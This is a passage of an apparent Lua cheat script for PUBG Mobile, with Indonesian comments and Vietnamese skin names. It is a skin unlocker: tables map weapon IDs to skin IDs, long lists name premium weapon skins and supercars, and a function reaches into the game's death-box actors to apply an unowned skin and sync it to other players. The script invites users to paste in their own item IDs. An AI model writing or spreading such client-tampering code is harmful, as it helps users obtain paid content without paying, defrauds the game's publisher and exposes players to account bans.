    [1102002043]={1020020372,1020020374,1020020373,1020020383,1020020380,1020020384,1020020379,1020020378,1020020377,1020020376,1020020375,1020020388,0,1020020385,1020020387,0,0,0,1020020386,0,0,0},
    [1102002061]={1020020552,1020020554,1020020553,1020020563,1020020562,1020020564,1020020559,1020020558,1020020557,1020020556,1020020555,1020020578,0,1020020565,1020020567,1020020573,1020020574,1020020572,1020020566,0,1020020569,0},
    [1102002136]={1020021314,1020021313,1020021315,1020021309,1020021308,1020021312,1020021307,1020021306,1020021305,1020021304,1020021303,1020021302,0,1020021318,1020021316,1020021323,1020021324,1020021322,1020021317,0,1020021325,0},
    [1102002424]={1020024193,1020024192,1020024194,1020024189,1020024188,1020024190,1020024187,1020024186,1020024185,1020024184,1020024183,1020024182,0,1020024197,1020024195,1020024199,1020024200,1020024198,1020024196,0,1020024202,0},
    [1102003080]={1020030755,1020030756,1020030758,0,1020030749,1020030754,1020030748,1020030747,1020030746,1020030745,1020030744,1020030764,0,1020030760,0,1020030759,1020030757,0,0,1020030765,0,0},
    [1102003100]={1020030956,1020030957,1020030958,1020030954,1020030950,1020030955,1020030949,1020030948,1020030947,1020030946,1020030945,1020030944,0,1020030964,0,1020030960,1020030959,1020030965,0,1020030967,1020030966,1020030968},
    [1102005064]={1020050588,1020050589,1020050590,0,0,0,1020050587,1020050586,1020050585,1020050584,1020050583,1020050582,0,0,0,0,0,0,0,0,1020050592,0},
    [1103001101]={1030010954,1030010955,1030010956,0,0,0,0,0,0,0,1030010953,1030010952,1030010951,0,0,0,0,0,0,1030010957,0,1030010958},
    [1103001146]={1030011344,1030011345,1030011346,0,0,0,0,0,0,0,1030011343,1030011342,1030011341,0,0,0,0,0,0,1030011347,0,1030011348},
    [1103001154]={1030011484,1030011485,1030011486,0,0,0,0,0,0,0,1030011483,1030011482,1030011481,0,0,0,0,0,0,1030011487,0,1030011488},
    [1103001179]={1030011738,1030011739,1030011741,0,0,0,1030011737,1030011736,1030011735,1030011734,1030011733,1030011732,1030011731,0,0,0,0,0,0,1030011742,1030011743,1030011744},
    [1103001191]={1030011858,1030011859,1030011861,0,0,0,1030011857,1030011856,1030011855,1030011854,1030011853,1030011852,1030011851,0,0,0,0,0,0,1030011862,1030011863,1030011864},
    [1103001202]={1030011948,1030011949,1030011950,0,0,0,1030011947,1030011946,1030011945,1030011944,1030011943,1030011942,1030011941,0,0,0,0,0,0,1030011951,1030011952,1030011953},
    [1103002030]={1030020245,1030020246,1030020247,1030020252,1030020249,1030020253,1030020258,1030020257,1030020256,1030020255,1030020244,1030020243,1030020242,0,0,0,0,0,0,1030020248,0,0},
    [1103002059]={1030020544,1030020545,1030020546,1030020542,1030020539,1030020543,1030020538,1030020537,1030020536,1030020535,1030020534,1030020533,1030020532,0,0,0,0,0,0,1030020547,1030020548,0},
    [1103002087]={1030020824,1030020825,1030020826,0,0,0,1030020818,1030020817,1030020816,1030020815,1030020814,1030020813,1030020812,0,0,0,0,0,0,1030020827,1030020828,0},
    [1103002106]={1030021009,1030021010,1030021012,1030021015,1030021014,1030021016,1030021008,1030021007,1030021006,1030021005,1030021004,1030021003,1030021002,0,0,0,0,0,0,1030021013,1030021017,0},
    [1103002113]={1030021079,1030021080,1030021082,1030021085,1030021084,1030021086,1030021078,1030021077,1030021076,1030021075,1030021074,1030021073,1030021072,0,0,0,0,0,0,1030021083,1030021087,0},
    [1103003022]={1030030165,1030030166,1030030167,1030030172,1030030169,1030030173,0,0,0,0,1030030164,1030030163,1030030162,0,0,0,0,0,0,0,0,0},
    [1103003030]={1030030256,1030030257,1030030258,1030030254,1030030253,1030030255,1030030248,1030030247,1030030246,1030030245,1030030244,1030030243,1030030242,0,0,0,0,0,0,1030030259,1030030249,0},
    [1103003042]={1030030374,1030030375,1030030376,1030030372,1030030369,1030030373,0,0,0,0,1030030364,1030030363,1030030362,0,0,0,0,0,0,1030030377,0,0},
    [1103003051]={1030030458,1030030459,1030030460,1030030456,1030030455,1030030457,0,0,0,0,1030030454,1030030453,1030030452,0,0,0,0,0,0,1030030463,0,0},
    [1103003062]={1030030568,1030030569,1030030570,1030030566,1030030565,1030030567,0,0,0,0,1030030564,1030030563,1030030562,0,0,0,0,0,0,1030030572,0,0},
    [1103003079]={1030030744,1030030745,1030030746,1030030742,1030030740,1030030743,1030030738,1030030737,1030030736,1030030735,1030030734,1030030733,1030030732,0,0,0,0,0,0,1030030747,1030030739,0},
    [1103003087]={1030030825,1030030826,1030030827,1030030823,1030030824,1030030824,1030030818,1030030817,1030030816,1030030815,1030030814,1030030813,1030030812,0,0,0,0,0,0,1030030828,1030030819,0},
    [1103004037]={1030040315,1030040316,1030040317,1030040325,1030040324,1030040323,0,0,0,0,1030040314,1030040313,1030040312,1030040327,1030040326,0,0,0,1030040328,1030040329,0,0},
    [1103006030]={1030060245,1030060246,1030060247,0,1030060253,1030060252,0,0,0,0,1030060244,1030060243,1030060242,0,0,0,0,0,0,0,0,0},
    [1103007028]={1030070233,1030070234,1030070235,1030070226,1030070225,1030070227,1030070218,1030070217,1030070216,1030070215,1030070214,1030070213,1030070212,0,0,0,0,0,0,1030070236,1030070219,0},
    [1103012010]={0,0,0,0,0,0,1030120038,1030120037,1030120036,1030120035,1030120034,1030120033,1030120032,0,0,0,0,0,0,0,0,0},
    [1103012019]={0,0,0,0,0,0,1030120138,1030120137,1030120136,1030120135,1030120134,1030120133,1030120132,0,0,0,0,0,0,0,0,0},
    [1103012031]={0,0,0,0,0,0,1030120258,1030120257,1030120256,1030120255,1030120254,1030120253,1030120252,0,0,0,0,0,0,0,0,0},
    [1103012039]={0,0,0,0,0,0,1030120339,1030120338,1030120337,1030120336,1030120335,1030120334,1030120333,0,0,0,0,0,0,0,0,0},
    [1103102007]={1031020026,1031020027,1031020028,1031020024,1031020023,1031020025,1031020019,1031020018,1031020017,1031020016,1031020015,1031020014,1031020013,0,0,0,0,0,0,1031020029,0,0},
    [1105001034]={0,0,0,0,1050010287,1050010289,1050010286,1050010285,1050010284,1050010283,1050010282,0,0,0,0,0,0,0,0,1050010292,0,0},
    [1105001048]={0,0,0,1050010429,1050010428,1050010434,1050010427,1050010426,1050010425,1050010424,1050010423,0,0,0,0,0,0,0,0,1050010435,0,1050010436},
    [1105001069]={0,0,0,1050010639,1050010638,1050010640,1050010637,1050010636,1050010635,1050010634,1050010633,1050010645,0,0,0,0,0,0,0,1050010643,1050010646,1050010644},
    [1105002091]={0,0,0,0,0,0,1050020847,1050020846,1050020845,1050020844,1050020843,1050020842,0,0,0,0,0,0,0,0,0,1050020848},
    [1105010019]={0,0,0,0,0,0,1050100144,1050100143,1050100142,1050100141,1050100139,1050100138,0,0,0,0,0,0,0,0,0,0}
}
-- TEMPELKAN ID AKSESORIS ANDA DI ATAS ↑↑↑

local cached_GameplayStatics = nil
local cached_PlayerTombBox = nil
local cached_ActorClass = nil
_G.NeedCheckDeadBoxTimer = 0

_G.DeadBox_TemperRequest = function(PlayerController)
    if not _G.LexusConfig.SkinDeadBox or _G.NeedCheckDeadBoxTimer <= 0 then return end
    
    local curTime = os.clock()
    if _G.LastCheckDeadBoxTime and (curTime - _G.LastCheckDeadBoxTime) < 2.0 then return end
    _G.LastCheckDeadBoxTime = curTime
    _G.NeedCheckDeadBoxTimer = _G.NeedCheckDeadBoxTimer - 1

    local PlayerCharacter = PlayerController:GetPlayerCharacterSafety()
    if not slua.isValid(PlayerCharacter) then return end
    
    if not cached_GameplayStatics then
        cached_GameplayStatics = import("GameplayStatics")
        cached_ActorClass = import("Actor")
        cached_PlayerTombBox = import("PlayerTombBox")
    end
    
    if not _G.CachedActorArray_DB then
        _G.CachedActorArray_DB = slua.Array(UEnums.EPropertyClass.Object, cached_ActorClass)
    end
    
    local UI_Util = require("client.common.ui_util")
    local GameInstance = UI_Util and UI_Util.GetGameInstance()
    if not GameInstance or not cached_GameplayStatics then return end

    -- Optimalisasi: Ambil ID pemain dan ID senjata/kendaraan di luar loop agar tidak dihitung ulang
    local myPlayerKey = PlayerController.PlayerKey
    local currentBoxSkinId = 0
    pcall(function()
        local curVeh = PlayerCharacter.CurrentVehicle or (type(PlayerCharacter.GetCurrentVehicle) == "function" and PlayerCharacter:GetCurrentVehicle())
        if slua.isValid(curVeh) and _G.CurrentEquipVehicleID and _G.CurrentEquipVehicleID ~= 0 then
            currentBoxSkinId = tonumber(tostring(_G.CurrentEquipVehicleID) .. "1") or 0
        else
            -- [FIX VIP STANDAR]: Ambil ID senjata yang sedang dipegang untuk menghasilkan peti mati yang benar, Hapus loop untuk cegah Drop FPS
            local curWeapon = PlayerCharacter.GetCurrentWeapon and PlayerCharacter:GetCurrentWeapon() or PlayerCharacter.CurrentWeapon
            if slua.isValid(curWeapon) then
                local defineIDObj = curWeapon.GetItemDefineID and curWeapon:GetItemDefineID()
                local curWeaponID = (defineIDObj and slua.isValid(defineIDObj)) and defineIDObj.TypeSpecificID or 0
                
                -- Cocokkan dengan database Skin yang tersimpan untuk dapat ID Skin saat ini
                if curWeaponID > 0 and _G.AddOutfitLastAppliedSkin and _G.AddOutfitLastAppliedSkin[curWeaponID] then
                    local skinID = _G.AddOutfitLastAppliedSkin[curWeaponID]
                    if skinID and skinID > 1000000 then 
                        currentBoxSkinId = skinID 
                    end
                end
            end
        end
    end)

    if currentBoxSkinId == 0 then return end

    local deadBoxes = cached_GameplayStatics.GetAllActorsOfClass(GameInstance, cached_PlayerTombBox, _G.CachedActorArray_DB)
    if not deadBoxes then return end
    
    local count = type(deadBoxes.Num) == "function" and deadBoxes:Num() or #deadBoxes
    for i = 1, count do
        local deadBoxActor = type(deadBoxes.Get) == "function" and deadBoxes:Get(i-1) or deadBoxes[i]
        if slua.isValid(deadBoxActor) and not deadBoxActor.bIsTDSkinApplied then
            local damageCauser = deadBoxActor.DamageCauser
            -- Bandingkan super cepat dengan MyPlayerKey yang sudah di-cache
            if slua.isValid(damageCauser) and damageCauser.PlayerKey == myPlayerKey then
                local DeadBoxAvatarComponent = deadBoxActor.DeadBoxAvatarComponent_BP
                if slua.isValid(DeadBoxAvatarComponent) then
                    pcall(function()
                        DeadBoxAvatarComponent:ResetItemAvatar()
                        DeadBoxAvatarComponent:PreChangeItemAvatar(currentBoxSkinId)
                        DeadBoxAvatarComponent:SyncChangeItemAvatar(currentBoxSkinId)
                    end)
                    deadBoxActor.bIsTDSkinApplied = true
                end
            end
        end
    end
end

--[[ AddOutfit v7.5 — Integrasi sistem pilih Skin melalui lemari (Wardrobe) ]]
local F = {}
local DEBUG = false  
function F.log(...)
    if DEBUG then print("[AddOutfit]", ...) end
end

local MATCH_CONFIG = {
    outfitRes = 0,        
    hatRes    = 0,        
    maskRes   = 0,
    glassRes  = 0,
    tshirtRes = 0,        
    pantsRes  = 0,        
    shoesRes  = 0,        
    bagRes    = 0,        
    helmetRes = 0,        
    weaponSkins = {},
}

-- Tabel ID supercar (Tambahkan bebas jika ada ID baru)
local ITEMS = {
    -- ==============================================================================
    -- SISTEM ASLI V7.5 (JANGAN HAPUS BARIS INI)
    -- ==============================================================================
    703029, 703044, 703046, 703048, 1400010, 1400062, 1400070, 1400083, 1400100, 1400106, 1400112, 1400117, 1400134, 1407917, 1400170, 
    1400172, 1400173, 1400174, 1400175, 1400177, 1400179, 1400180, 1400228, 1400231, 1400233, 1400236, 1400237, 1400238, 1400242, 1400244,
    202408070, 202408071, 202408072, 202408073, 202408074, 202408075,
    1407905, 1407906, 1407907, 1407908, 1407909, 1407910, 1407911, 1407912, 1407913, 1407914, 1407915, 1407916, 1410585,
    -- ==============================================================================
    -- 1. SENJATA UPGRADE (HANYA AMBIL TINGKAT TERTINGGI DARI SETIAP SENJATA)
    -- ==============================================================================
    -- [ M416 ]
    1101004163, -- Hoàng Gia Lộng Lẫy - M416 (Cấp 8)
    1101004201, -- Bạch Lân Nhả Ngọc - M416 (Cấp 8)
    1101004209, -- Thủy Triều Dậy Sóng - M416 (Cấp 8)
    1101004218, -- Ma Ảnh - M416 (Cấp 8)
    1101004226, -- Phong Ấn U Minh - M416 (Cấp 8)
    1101004236, -- Lam Sư Đoạt Mệnh - M416 (Cấp 8)
    1101004246, -- Hỏa Liên - M416 (Cấp 8)
    1101004046, -- Băng giá - M416 (Cấp 7)
    1101004062, -- Chú hề - M416 (Cấp 7)
    1101004078, -- Kẻ lang thang - M416 (Cấp 7)
    1101004086, -- Bò Sát Gầm Gừ - M416 (Cấp 7)
    1101004098, -- Tiếng Gọi Hoang Dã - M416 (Cấp 7)
    1101004138, -- Lõi Công Nghệ - M416 (Cấp 7)

    -- [ AKM ]
    1101001174, -- Bạo Chúa Bộ Lạc - AKM (Cấp 8)
    1101001213, -- Đô Đốc Hải Long Tinh - AKM (Cấp 8)
    1101001242, -- Ngày Phán Quyết - AKM (Cấp 8)
    1101001265, -- Thời Quang Khả Biến - AKM (Cấp 8)
    1101001276, -- Huyễn Thần - AKM (Cấp 8)
    1101001063, -- Huyền thoại Seven Seas - AKM (Cấp 7)
    1101001089, -- Băng giá - AKM (Cấp 7)
    1101001103, -- Hóa Thạch - AKM (Cấp 7)
    1101001116, -- Bí Ngô Kinh Dị - AKM (Cấp 7)
    1101001128, -- Long Vương - AKM (Cấp 7)
    1101001143, -- Hải Tặc Vàng - AKM (Cấp 7)
    1101001154, -- Người Giải Mã - AKM (Cấp 7)
    1101001231, -- Thỏ Tinh Nghịch - AKM (Cấp 7)
    1101001249, -- Thánh Quang (Trăng Thần) - AKM (Cấp 7)
    1101001256, -- Thánh Quang (Lông Vũ Hoàng Kim) - AKM (Cấp 7)
    1101001042, -- Ánh kim - AKM (Cấp 6)
    1101001068, -- Hổ gầm gừ - AKM (Cấp 5)

    -- [ SCAR-L ]
    1101003146, -- Gai Tà Ác - SCAR-L (Cấp 8)
    1101003167, -- Ma Vương Huyết Hồn - SCAR-L (Cấp 8)
    1101003227, -- Thiên Điểu - SCAR-L (Cấp 8)
    1101003057, -- Súng nước - SCAR-L (Cấp 7)
    1101003070, -- Bí Ngô Ma Quái - SCAR-L (Cấp 7)
    1101003080, -- Chiến Dịch Vì Ngày Mai - SCAR-L (Cấp 7)
    1101003099, -- Drop Da Bass - SCAR-L (Cấp 7)
    1101003119, -- Tinh thể Hextech SCAR-L (Cấp 7)
    1101003188, -- Cái Ôm Của Chú Hề - SCAR-L (Cấp 7)
    1101003195, -- Thánh Nữ Huyền Ảo - SCAR-L (Cấp 7)
    1101003208, -- Vương Quốc Huyền Ảo - SCAR-L (Cấp 7)
    1101003219, -- Kính Pha Lê - SCAR-L (Cấp 7)
    1101003173, -- Ánh Sáng Hoàng Tộc - SCAR-L (Cấp 5)
    1101003212, -- Mèo Ăn Vặt - SCAR-L (Cấp 3)

    -- [ M762 ]
    1101008081, -- Vị Khách Nổi Loạn - M762 (Cấp 8)
    1101008104, -- Lõi Sao Huyền Ảo - M762 (Cấp 8)
    1101008146, -- Bạch Cốt U Minh - M762 (Cấp 8)
    1101008154, -- Khung Xương - M762 (Cấp 8)
    1101008051, -- Bản Nhạc Tình Yêu - M762 (Cấp 7)
    1101008061, -- Phát Bắn Chí Mạng - M762 (Cấp 7)
    1101008070, -- GACKT MOONSAGA - M762 (Cấp 7)
    1101008116, -- Biểu Tượng Bóng Đá Messi - M762 (Cấp 7)
    1101008126, -- Huyết Rồng - M762 (Cấp 7)
    1101008136, -- Tiên Linh Lưu Ly - M762 (Cấp 7)
    1101008163, -- Cổ Vật Hắc Ám - M762 (Cấp 7)
    1101008026, -- Pony Bé Nhỏ - M762 (Cấp 5)
    1101008036, -- Đóa Sen Phẫn Nộ - M762 (Cấp 5)

    -- [ AUG ]
    1101006062, -- Tinh Linh Băng Giá - AUG (Cấp 8)
    1101006085, -- Hoa Hồng Ma Mị - AUG (Cấp 8)
    1101006075, -- Hỏa Ca - AUG (Cấp 7)
    1101006033, -- Gánh Xiếc Rong - AUG (Cấp 5)
    1101006044, -- Evangelion Angel Thứ 4 - AUG (Cấp 5)
    1101006067, -- Ác Mộng Biển Sâu - AUG (Cấp 5)

    -- [ GROZA ]
    1101005038, -- Ryomen Sukuna - Groza (Cấp 7)
    1101005052, -- Lửa U Minh - Groza (Cấp 7)
    1101005098, -- Godzilla Bốc Lửa - Groza (Cấp 7)
    1101005019, -- Kỵ Binh Rừng Sâu - GROZA (Cấp 5)
    1101005025, -- Đêm Huyền Ảo - GROZA (Cấp 5)
    1101005043, -- Trận Chiến Sắc Màu - Groza (Cấp 5)
    1101005082, -- Lồng Đèn Bí Ngô - Groza (Cấp 5)
    1101005090, -- Di Tích Thượng Cổ - Groza (Cấp 5)
    1101005105, -- Singam Roar - Groza (Cấp 5)

    -- [ QBZ & Mk47 & G36C & Honey Badger & FAMAS & ASM Abakan & ACE32 ]
    1101007046, -- Công Chúa Hắc Ám - QBZ (Cấp 7)
    1101007062, -- Hoa Kiếm Chí Mạng - QBZ (Cấp 7)
    1101007071, -- Thiên Mệnh - QBZ (Cấp 7)
    1101007025, -- Ánh Dương - QBZ (Cấp 5)
    1101007036, -- Càn Quét - QBZ (Cấp 5)
    1101007079, -- Băng Quyền - QBZ (Cấp 5)
    1101009019, -- Thỏ Tinh Quái - Mk47 (Cấp 3)
    1101010029, -- Xung Nhịp Sân Cỏ - G36C (Cấp 5)
    1101012033, -- Cổ Mộc Chiến Khí - Honey Badger (Cấp 7)
    1101012009, -- Sắc Màu Huyền Ảo - Honey Badger (Cấp 5)
    1101012018, -- Thanh Âm Du Dương - Honey Badger (Cấp 5)
    1101012024, -- Honey Badger Mikey (Cấp 5)
    1101100012, -- Đế Vương Thần Vực - FAMAS (Cấp 8)
    1101100018, -- Ảo Ảnh Điện Tử - FAMAS (Cấp 5)
    1101101007, -- Uy Vũ Hắc Điểu - ASM Abakan (Cấp 7)
    1101102025, -- Thủy Quái - ACE32 (Cấp 8)
    1101102041, -- Tiên Tri Điềm Lành - ACE32 (Cấp 8)
    1101102049, -- Thì Thầm Cánh Bướm - ACE32 (Cấp 8)
    1101102007, -- Kamehameha - ACE32 (Cấp 7)
    1101102017, -- Ngọc Bích - ACE32 (Cấp 7)
    1101102032, -- Cáo Tinh Nghịch - ACE32 (Cấp 5)

    -- [ SMG (UZI, UMP45, Vector, Thompson, Bizon, MP5K, P90) ]
    1102001120, -- Băng Giá - UZI (Cấp 8)
    1102001130, -- Xiềng Xích Hỏa Ngục - UZI (Cấp 7)
    1102001024, -- Savagery - UZI (Cấp 6)
    1102001036, -- Vật Tổ Thần Bí - UZI (Cấp 5)
    1102001058, -- Khoảnh Khắc Bất Ngờ - UZI (Cấp 5)
    1102001069, -- UZI Quang Hóa (Cấp 5)
    1102001089, -- Ma Pháp - UZI (Cấp 5)
    1102001103, -- Cam Tươi Mát - UZI (Cấp 5)
    1102001102, -- Máy Ép Trái Cây - UZI (Cấp 5)
    1102002438, -- Song Tử Chiến - UMP45 (Cấp 8)
    1102002446, -- Song Tử Đỏ Thẫm - UMP45 (Cấp 8)
    1102002043, -- Hỏa long - UMP45 (Cấp 7)
    1102002061, -- Ảo Mộng Chết Chóc - UMP45 (Cấp 7)
    1102002136, -- Băng Giá - UMP45 (Cấp 7)
    1102002424, -- Thần Khí Anukhra - UMP45 (Cấp 7)
    1102002053, -- EMP - UMP45 (Cấp 5)
    1102002070, -- Đồ Tể Bạch Kim - UMP45 (Cấp 5)
    1102002090, -- Cuộc Chiến 8-Bit - UMP45 (Cấp 5)
    1102002112, -- Ngày Giáng Sinh - UMP45 (Cấp 5)
    1102002117, -- Ong Bắp Cày - UMP45 (Cấp 5)
    1102002129, -- Con Sóng Lễ Hội - UMP45 (Cấp 5)
    1102002143, -- PUBGM X NewJeans - UMP45 (Cấp 5)
    1102003080, -- Cánh Rồng - Vector (Cấp 7)
    1102003100, -- Tuyết Diệt Ảnh - Vector (Cấp 7)
    1102003020, -- Nanh Dơi Huyết Tộc - Vector (Cấp 5)
    1102003031, -- Hoa Hồng Đêm - Vector (Cấp 5)
    1102003039, -- Gấu Tinh Nghịch - Vector (Cấp 5)
    1102003052, -- Bá Tước Vàng - Vector (Cấp 5)
    1102003065, -- Lưỡi Liềm Vàng - Vector (Cấp 5)
    1102003072, -- Sát Thủ Tối Thượng - Vector (Cấp 5)
    1102003090, -- KMF Lancelot - Vector (Cấp 5)
    1102004018, -- Kẹo ngọt - Thompson (Cấp 5)
    1102004034, -- Máy Chạy Hơi Nước - Thompson (Cấp 5)
    1102004048, -- Tử Đằng - Thompson SMG (Cấp 3)
    1102005064, -- Quang Ảo Điện Tử - PP-19 Bizon (Cấp 7)
    1102005007, -- Tắc Kè - PP-19 Bizon (Cấp 5)
    1102005020, -- Skullcrusher - PP-19 Bizon (Cấp 5)
    1102005041, -- Thần Binh Võ Thuật - PP-19 Bizon (Cấp 5)
    1102005052, -- DP Quantum Quake - Bizon (Cấp 5)
    1102005057, -- Lân Sư - PP-19 Bizon (Cấp 5)
    1102005072, -- Huyết Tế - PP-19 Bizon (Cấp 5)
    1102005078, -- SAKAMOTO SHOP - PP-19 (Cấp 5)
    1102007019, -- PUBGM X QWER - MP5K (Cấp 5)
    1102007022, -- Pixel Cổ Điển - MP5K (Cấp 3)
    1102105012, -- Miêu Nữ Công Nghệ - P90 (Cấp 7)
    1102105028, -- Thiên Mã - P90 (Cấp 7)
    1102105018, -- Móng Vuốt Hoàng Kim - P90 (Cấp 5)

    -- [ SNIPER & MARKSMAN RIFLE (Kar98, M24, AWM, SKS, SLR, Mk14, etc.) ]
    1103001202, -- Băng Yêu - Kar98K (Cấp 8)
    1103001060, -- Dấu nanh Phẫn nộ - Kar98K (Cấp 7)
    1103001079, -- Kukulkan Cuồng Nộ - Kar98K (Cấp 7)
    1103001101, -- Ánh Trăng - Kar98K (Cấp 7)
    1103001129, -- Gackt Moon - Kar98K (Cấp 7)
    1103001146, -- Cá Mập Titan - Kar98K (Cấp 7)
    1103001154, -- Mật Mã Chết Chóc - Kar98K (Cấp 7)
    1103001179, -- Điện Cực Tím - Kar98K (Cấp 7)
    1103001191, -- Hồng Hỏa Diệm - Kar98K (Cấp 7)
    1103001085, -- Đêm Nhạc Rock - Kar98K (Cấp 5)
    1103001160, -- Thợ Săn Tinh Vân - Kar98K (Cấp 5)
    1103001183, -- Nhịp Điệu Mèo Con - Kar98K (Cấp 3)
    1103002030, -- Quyền Trượng Pharaoh - M24 (Cấp 7)
    1103002059, -- Tuần Hoàn Sự Sống - M24 (Cấp 7)
    1103002087, -- Nhịp Điệu Hoàn Mỹ - M24 (Cấp 7)
    1103002106, -- Minh Nguyệt Cấm Vực - M24 (Cấp 7)
    1103002156, -- Bình Minh Bóng Tối - M24 (Cấp 7)
    1103002049, -- Hồ Điệp Phu Nhân - M24 (Cấp 5)
    1103002047, -- Giai Điệu Chí Mạng - M24 (Cấp 5)
    1103002094, -- Công Nghệ Cao - M24 (Cấp 5)
    1103003022, -- Neon - AWM (Cấp 7)
    1103003030, -- Chỉ Huy Chiến Trường - AWM (Cấp 7)
    1103003042, -- Godzilla - AWM (Cấp 7)
    1103003051, -- Đại Long Cầu Vồng - AWM (Cấp 7)
    1103003062, -- Hỏa Phượng Hoàng - AWM (Cấp 7)
    1103003079, -- Huyết Hải Thiên Long - AWM (Cấp 7)
    1103003087, -- Thanh Hoa Xà - AWM (Cấp 7)
    1103003099, -- Hắc Khí - AWM (Cấp 7)
    1103003092, -- Hồng Hoang - AWM (Cấp 5)
    1103004037, -- Quý Bà Đỏ - SKS (Cấp 7)
    1103004046, -- Rừng Thép - SKS (Cấp 5)
    1103004058, -- Năng Lượng Băng Tuyết - SKS (Cấp 5)
    1103004080, -- Khiết Hoa Nở Rộ - SKS (Cấp 5)
    1103004087, -- Giai Điệu Tử Thần - SKS (Cấp 5)
    1103005024, -- Quạ Đen - VSS (Cấp 5)
    1103005048, -- Trinh Sát Tuyết Trắng - VSS (Cấp 3)
    1103009022, -- Mùa Hoa Đào - SLR (Cấp 5)
    1103009037, -- Ngọn Lửa Ma Thuật - SLR (Cấp 5)
    1103009051, -- Ma Mộng - SLR (Cấp 5)
    1103009042, -- Thanh Âm Hải Huyền - SLR (Cấp 3)
    1103006030, -- Sông Băng - Mini14 (Cấp 7)
    1103006046, -- Nét Đẹp Thuần Khiết - Mini14 (Cấp 5)
    1103006058, -- Mèo Chiêu Tài - Mini14 (Cấp 5)
    1103006063, -- Tay Đua Gan Dạ - Mini14 (Cấp 5)
    1103006075, -- Nhịp Chiến Nhanh - Mini14 (Cấp 5)
    1103007028, -- Vương Quốc Rồng - Mk14 (Cấp 8)
    1103007020, -- Sức Mạnh Ngân Hà - Mk14 (Cấp 5)
    1103007038, -- Rồng Sữa Mềm Mại - Mk14 (Cấp 5)
    1103007043, -- Hộp Quà May Mắn - Mk14 (Cấp 5)
    1103012010, -- Khủng Long Ephialtes - AMR (Cấp 8)
    1103012019, -- Hỏa Thần - AMR (Cấp 7)
    1103012031, -- Vô Âm Ly Biệt - AMR (Cấp 7)
    1103012039, -- Đại Chiến Huyễn Sắc - AMR (Cấp 7)
    1103012024, -- Tinh Thể Onyx - AMR (Cấp 5)
    1103100007, -- Thú Săn Mồi - Mk12 (Cấp 5)
    1103102007, -- Chiến Hạm Vũ Trụ - DSR (Cấp 7)
    1103103007, -- Vinh Quang Chiến Binh - M1 Garand (Cấp 7)

    -- [ SHOTGUN & MACHINE GUN (S12K, DBS, M249, DP-28, MG3...) ]
    1104001035, -- Độc Hồn - S686 (Cấp 5)
    1104002022, -- Chạng Vạng - S1897 (Cấp 5)
    1104002049, -- Xung Kích Sắc Màu - S1897 (Cấp 3)
    1104003026, -- S12K GACKT (Cấp 7)
    1104003037, -- Kích Hoạt Nguyên Tử - S12K (Cấp 5)
    1104003046, -- Trái Tim Cyber - S12K (Cấp 5)
    1104004035, -- Chiến Giáp Quái Thú - DBS (Cấp 5)
    1104004041, -- Sandsinger - DBS (Cấp 5)
    1104004051, -- Okarun - DBS (Cấp 5)
    1104004024, -- Báo Sắc Màu - DBS (Cấp 3)
    1104102004, -- Tàn Tích Hoàng Kim - NS2000 (Cấp 3)
    1105001034, -- Pháo Giáng Sinh - M249 (Cấp 7)
    1105001048, -- Nữ Đế Ánh Sáng - M249 (Cấp 7)
    1105001069, -- Vương Quyền Hắc Ám - M249 (Cấp 7)
    1105001020, -- Nữ Hoàng Băng Giá M249 V (Cấp 5)
    1105001054, -- Stargaze Fury - M249 (Cấp 5)
    1105001062, -- Graffiti Đường Phố - M249 (Cấp 5)
    1105001075, -- Cá Mập Thép - M249 (Cấp 4)
    1105002091, -- Huyết Họa - DP28 (Cấp 8)
    1105002018, -- Sát Thủ Bí Ẩn - DP-28 (Cấp 5)
    1105002035, -- Ngọc Long - DP-28 (Cấp 5)
    1105002058, -- Chiến Binh Hàng Hải - DP28 (Cấp 5)
    1105002063, -- Rồng Thần Shenron - DP-28 (Cấp 5)
    1105002071, -- Chiến Sĩ Thần Giáp - DP-28 (Cấp 5)
    1105002076, -- Mèo Số Hóa - DP-28 (Cấp 5)
    1105002083, -- DP-28 Frieren's Staff (Cấp 5)
    1105002096, -- Hồ Tộc - DP-28 (Cấp 3)
    1105010019, -- Chiến Thần Bầu Trời - MG3 (Cấp 7)
    1105010008, -- Thiên Khung - MG3 (Cấp 5)
    1105010026, -- Mina Ashiro - MG3 (Cấp 5)

    -- [ SENJATA JARAK DEKAT & LAINNYA (Skorpion, Busur, Wajan, Pisau...) ]
    1106008013, -- Mật Mã Vàng - Skorpion (Cấp 5)
    1106008022, -- Bí Ẩn Tinh Tú - Skorpion (Cấp 3)
    1106011008, -- Rồng Rắn Lên Mây - MP7 Kép (Cấp 5)
    1106011003, -- Thợ Săn Kẹo - MP7 (Cấp 3)
    1107001018, -- Chúa Hề Thịnh Nộ - Busur (Cấp 3)
    1107098003, -- Rung Chấn Công Nghệ - MGL (Cấp 3)
    1108001057, -- Săn Rồng - Pisau (Cấp 3)
    1108001064, -- Đoản Kiếm Yor SPY×FAMILY (Cấp 3)
    1108001069, -- Ki Sword (Cấp 3)
    1108001081, -- Rìu Godzilla Bốc Lửa (Cấp 3)
    1108001085, -- Kiếm Trung Đoàn Trinh Sát Cấp 3
    1108001098, -- Thương Đảo Ngược Thiên Đường - Pisau (Cấp 3)
    1108001104, -- Xích Tay - Pisau (Cấp 3)
    1108002059, -- Đinh Ba Thủy Triều Thịnh Nộ (Cấp 5)
    1108004125, -- Hũ Mật Ong - Wajan (Cấp 5)
    1108004160, -- Cá Sấu - Wajan (Cấp 5)
    1108004145, -- Đêm Nhạc Rock - Wajan (Cấp 5)
    1108004283, -- Vinh Quang - Wajan (Cấp 6)
    1108004337, -- Wajan Listrik (Cấp 6)
    1108004356, -- Ayam Goreng - Wajan (Cấp 3)
    1108004365, -- Yokai Misterius - Wajan (Cấp 3)
    1108004377, -- Wajan Penguin Ceria (Cấp 5)
    1108004416, -- Kipas Tarian Panas - Wajan (Cấp 3)
    1108005050, -- Naga Es - Belati (Cấp 3)

    -- ==============================================================================
    -- 2. SUPER CAR LENGKAP (VIP VEHICLES)
    -- ==============================================================================
    -- [ McLaren ]
    1961007, -- McLaren 570S (Hitam)
    1961010, -- McLaren 570S (Putih)
    1961012, -- McLaren 570S (Merah Muda)
    1961013, -- McLaren 570S (Putih Emas)
    1961014, -- McLaren 570S (Emas Hitam)
    1961015, -- McLaren 570S (Metalik)
    1961147, -- McLaren P1 (Langit Berbintang)
    1961148, -- McLaren P1 (Merah Muda Cemerlang)
    1961149, -- McLaren P1 (Emas Vulkanik)
    1907054, -- Mobil Balap Tim McLaren F1 (Elektronik)
    1907058, -- Mobil Balap Tim McLaren F1
    1907059, -- Mobil Balap Tim McLaren F1 (Kemenangan)

    -- [ Koenigsegg ]
